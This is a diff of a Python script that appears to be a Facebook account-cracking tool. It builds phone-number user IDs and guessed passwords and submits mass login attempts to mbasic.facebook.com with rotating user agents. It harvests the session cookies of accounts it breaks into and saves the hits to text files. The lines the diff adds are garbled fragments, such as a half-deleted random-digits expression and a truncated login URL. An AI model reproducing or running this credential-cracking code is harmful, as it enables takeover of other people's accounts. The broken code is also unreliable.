@@ -134,7 +134,7 @@ def num():
     print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
     
     kode = input(' [?] Enter sim code: ')
-    kodex = ''.join(random.choice(string.digits) for _ in range(2))
+    g.digits) for _ in range(2))
     kod = ''.join(random.choice(string.digits) for _ in range(2))
     os.system('clear')
     print(logo)
@@ -154,8 +154,8 @@ def num():
         print(' \033[1;97m[+] Use flight mode for speed up ')
         print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         for guru in user:
-            uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
+    
+       ,k,]
             yaari.submit(rcrack1,uid,pwx,tl)
     print(' [+] Crack process has been completed')
     print(' [+] Ids saved in EMRAN-ok.txt,EMRAN-cp.txt')
@@ -204,11 +204,10 @@ def rcrack1(uid,pwx,tl):
     global proxy
     try:
         for ps in pwx:
-            pro = random.choice(ugen)
+    
             session = requests.Session()
             sys.stdout.write('\r[\033[1;92m[EMRAN]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
-            free_fb = session.get('https://p.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -222,7 +221,7 @@ def rcrack1(uid,pwx,tl):
             header_freefb =  {'authority': 'mbasic.facebook.com',
             'method':'GET',
             'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
-            'scheme':'https',
+            ,
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
@@ -235,9 +234,8 @@ def rcrack1(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro }
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
+           //mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+    .get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
